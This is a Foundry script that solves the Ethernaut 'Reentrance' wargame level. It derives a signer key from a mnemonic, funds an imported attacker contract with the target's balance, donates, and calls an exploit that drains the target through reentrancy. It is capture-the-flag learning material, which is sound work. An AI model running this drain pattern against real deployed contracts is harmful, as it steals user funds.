// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { ReentranceAttacker } from "ethernaut/10-reentrancy/ReentranceAttacker.sol";
import { IReentrance } from "ethernaut/10-reentrancy/IReentrance.sol";

contract ReentranceScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address reentranceAddr = vm.envAddress("L10_REENTRANCE_ADDRESS");
        IReentrance reentrance = IReentrance(payable(reentranceAddr));

        // Step 1: get Reentrance balance (0.009 ether)
        uint256 reentranceBalance = reentranceAddr.balance;

        // Step 2: deploy ReentranceAttacker funded with Reetrance balance
        ReentranceAttacker reentranceAttacker = new ReentranceAttacker{value: reentranceBalance}();

        // Step 3: donate to ReentranceAttacker into Reentrance
        reentrance.donate{value: reentranceBalance}(address(reentranceAttacker));

        // Step 4: exploit using a re-entrancy attack via `IReentrance.withdraw()`
        reentranceAttacker.exploit(reentranceAddr, reentranceBalance);

        vm.stopBroadcast();
    }
}
